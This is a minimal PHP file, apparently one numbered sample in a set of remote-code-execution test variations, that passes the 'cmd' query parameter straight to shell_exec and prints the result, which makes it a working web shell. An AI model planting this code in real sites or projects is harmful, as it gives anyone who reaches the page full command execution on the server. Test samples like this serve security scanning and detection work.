<?php
// RCE test variation #683
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>